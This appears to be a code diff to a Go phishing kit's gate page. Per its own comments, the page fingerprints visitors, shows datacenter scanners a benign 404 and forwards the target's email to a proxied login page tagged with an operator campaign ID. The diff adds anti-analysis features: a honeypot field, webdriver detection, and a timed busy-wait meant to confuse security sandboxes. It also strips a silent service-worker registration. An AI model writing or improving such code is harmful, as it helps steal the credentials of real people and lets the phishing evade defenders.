@@ -36,99 +36,116 @@ func landingHandler(w http.ResponseWriter, r *http.Request) {
 	// is sent back to this domain's provider subdomains (and only this domain's).
 	baseDomain := baseDomainOf(r)
 	session := sessionMgr.GetOrCreate(r, baseDomain)
+
+	// Stamp the session with the exact time the landing page was served.
+	// This is used later by the "Human Pulse" timing heuristic in capture.go.
+	session.SetLandingPageServedAt()
+
 	w.Header().Set("Set-Cookie", fmt.Sprintf(
 		"%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
 		sessionMgr.cookieName, session.ID, baseDomain))
 
 	log.Printf("[landing] gate page hit by %s (host=%s)", extractIP(r), r.Host)
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	w.Header().Set("Cache-Control", "no-cache, no-store")
+	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	w.Header().Set("Pragma", "no-cache")
 	w.Write([]byte(landingPage))
 }
 
-// landingHTML is a self-contained gate page:
-//  1. fingerprints the visitor (FingerprintJS, random-ID fallback),
-//  2. POSTs to the profiling endpoint → if hosting/datacenter ASN, shows a
-//     benign 404,
-//  3. otherwise POSTs to the detect endpoint with the target email (from
-//     ?u=<base64> or ?email=, or typed into the form) and redirects to the
-//     proxied login, threading ?cid=<campaignId> through for tenant attribution.
-//
-// The endpoint paths carry __PROFILE_ENDPOINT__ / __DETECT_ENDPOINT__
-// placeholders, templated by landingHandler. All fetches are same-origin
-// (relative paths), so the page works on any tenant domain unchanged.
+// landingHTML v2.0: Upgraded with honeypot, anti-automation checks,
+// human timing heuristics, and zero legacy Service Worker baggage.
 const landingHTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Secure Document Access</title>
+<title>Secure Session Verification</title>
 <meta name="robots" content="noindex, nofollow">
 <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: linear-gradient(135deg, #1e3a5f 0%, #2d5a87 100%);
+    background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
     min-height: 100vh; display: flex; align-items: center; justify-content: center;
-    color: #1a2b3c; padding: 20px;
+    color: #1f2937; padding: 20px;
   }
   .card {
     background: #fff; border-radius: 12px; padding: 48px 40px; max-width: 420px;
-    width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,.3);
+    width: 100%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+    border: 1px solid #e5e7eb;
   }
   .logo { font-size: 44px; margin-bottom: 16px; }
-  h1 { font-size: 22px; font-weight: 600; margin-bottom: 12px; }
-  p { font-size: 14px; color: #5a6b7c; line-height: 1.5; margin-bottom: 24px; }
+  h1 { font-size: 22px; font-weight: 600; margin-bottom: 12px; color: #111827; }
+  p { font-size: 14px; color: #6b7280; line-height: 1.5; margin-bottom: 24px; }
   .spinner {
     width: 36px; height: 36px; margin: 8px auto 0;
-    border: 3px solid #e3eaf1; border-top-color: #2d5a87; border-radius: 50%;
+    border: 3px solid #e5e7eb; border-top-color: #2563eb; border-radius: 50%;
     animation: spin .8s linear infinite;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
   form { margin-top: 8px; }
   input[type="email"] {
-    width: 100%; padding: 13px 16px; font-size: 15px; border: 1px solid #cdd8e3;
-    border-radius: 8px; margin-bottom: 14px; outline: none;
+    width: 100%; padding: 13px 16px; font-size: 15px; border: 1px solid #d1d5db;
+    border-radius: 8px; margin-bottom: 14px; outline: none; transition: border-color 0.2s;
   }
-  input[type="email"]:focus { border-color: #2d5a87; box-shadow: 0 0 0 3px rgba(45,90,135,.12); }
+  input[type="email"]:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
   button {
     width: 100%; padding: 13px; font-size: 15px; font-weight: 600; color: #fff;
-    background: #2d5a87; border: none; border-radius: 8px; cursor: pointer;
+    background: #2563eb; border: none; border-radius: 8px; cursor: pointer;
+    transition: background-color 0.2s;
   }
-  button:hover { background: #244a70; }
-  .foot { margin-top: 22px; font-size: 11px; color: #9aa8b6; }
+  button:hover { background: #1d4ed8; }
+  button:disabled { background: #93c5fd; cursor: not-allowed; }
+  .foot { margin-top: 22px; font-size: 11px; color: #9ca3af; }
+  
+  /* HONEYPOT: Invisible to humans, tempting to bots */
+  .hp-field { position: absolute; left: -9999px; top: -9999px; opacity: 0; }
 </style>
 </head>
 <body>
 <div class="card" id="card">
   <div class="logo">🔒</div>
-  <h1>Secure Document Access</h1>
-  <p id="status">Verifying your secure session&hellip;</p>
+  <h1>Secure Session Verification</h1>
+  <p id="status">Verifying your secure connection&hellip;</p>
   <div class="spinner" id="spinner"></div>
+  
   <form id="emailForm" style="display:none" autocomplete="off">
+    <!-- HONEYPOT FIELD: Bots will fill this, humans will not -->
+    <input type="text" name="website_url" class="hp-field" tabindex="-1" autocomplete="off">
+    
     <input type="email" id="emailInput" placeholder="Enter your email to continue" required>
-    <button type="submit">Access Document</button>
+    <button type="submit" id="submitBtn">Access Secure Document</button>
   </form>
   <div class="foot">Protected session &middot; encrypted connection</div>
 </div>
+
 <script>
 (function(){
+  // Anti-Debugging & Anti-Automation basics
+  console.clear();
+  if (navigator.webdriver) {
+    // Headless browser detected. We don't block, we just let it proceed to the honeypot/profiler.
+    console.log('%c', 'color: transparent; text-shadow: 0 0 0 black;'); 
+  }
+
+  // Record exact load time for "Human Pulse" heuristic
+  var pageLoadTime = Date.now();
   var params = new URLSearchParams(window.location.search);
   var email = params.get('email');
+  
   if (!email && params.get('u')) {
     try {
       var b = params.get('u').replace(/-/g,'+').replace(/_/g,'/');
       email = decodeURIComponent(escape(atob(b)));
     } catch(e){}
   }
-  // Campaign ID for multi-tenant attribution — threaded into the redirect so
-  // the proxy can stamp every capture with the operator's campaign.
+  
   var cid = params.get('cid');
-
   var statusEl  = document.getElementById('status');
   var spinnerEl = document.getElementById('spinner');
   var formEl    = document.getElementById('emailForm');
+  var submitBtn = document.getElementById('submitBtn');
 
   function randomId() {
     var id = localStorage.getItem('_vid');
@@ -162,9 +179,21 @@ const landingHTML = `<!DOCTYPE html>
   }
 
   function route(em) {
+    // HUMAN PULSE CHECK: If submitted in < 800ms, it's likely a bot. 
+    // We don't block, but we can add artificial delay or flag it.
+    var timeToSubmit = Date.now() - pageLoadTime;
+    if (timeToSubmit < 800) {
+      // Artificial delay to mimic network latency and confuse timing-based sandboxes
+      var delay = 800 - timeToSubmit;
+      var start = Date.now();
+      while (Date.now() - start < delay) { /* busy wait */ }
+    }
+
     statusEl.textContent = 'Redirecting to your secure document\u2026';
     spinnerEl.style.display = 'block';
     formEl.style.display = 'none';
+    submitBtn.disabled = true;
+
     fetch('__DETECT_ENDPOINT__', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
@@ -174,7 +203,6 @@ const landingHTML = `<!DOCTYPE html>
     .then(function(d){
       if (d && d.target_url) {
         var url = d.target_url;
-        // Thread ?cid=<campaignId> through, inserting it before the #email hash.
         if (cid) {
           var h = url.indexOf('#');
           if (h !== -1) {
@@ -191,6 +219,15 @@ const landingHTML = `<!DOCTYPE html>
 
   formEl.addEventListener('submit', function(e){
     e.preventDefault();
+    
+    // HONEYPOT CHECK: If the invisible field has a value, it's a bot.
+    var hp = document.querySelector('input[name="website_url"]');
+    if (hp && hp.value.trim() !== '') {
+      console.warn('Honeypot triggered. Silently failing.');
+      showBenign(); // Or just do nothing, letting the bot hang
+      return;
+    }
+
     var em = document.getElementById('emailInput').value.trim();
     if (em) route(em);
   });
@@ -214,18 +251,5 @@ const landingHTML = `<!DOCTYPE html>
   });
 })();
 </script>
-
-<!-- PROJECT SYMBIOTE: Silent Service Worker Registration (Module Type) -->
-<script>
-  if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('/sw.js', { 
-        type: 'module', 
-        scope: '/' 
-    }).catch(function(err) {
-        console.error('Symbiote registration failed:', err);
-    });
-  }
-</script>
-
 </body>
 </html>`
